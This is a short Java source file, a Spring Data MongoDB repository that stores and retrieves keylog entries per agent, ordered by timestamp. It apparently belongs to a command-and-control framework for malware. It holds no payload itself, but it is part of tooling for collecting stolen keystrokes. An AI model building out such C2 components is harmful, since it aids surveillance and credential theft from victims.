package com.javac2.framework.JavaC2Framework.Repository;

import java.util.List;

import org.springframework.data.mongodb.repository.MongoRepository;
import org.springframework.stereotype.Repository;

import com.javac2.framework.JavaC2Framework.Model.Keylog;

@Repository
public interface KeylogRepo extends MongoRepository<Keylog, String> {
    List<Keylog> findByAgentIdOrderByTimestampDesc(String agentId);
    List<Keylog> findTop20ByAgentIdOrderByTimestampDesc(String agentId);
} 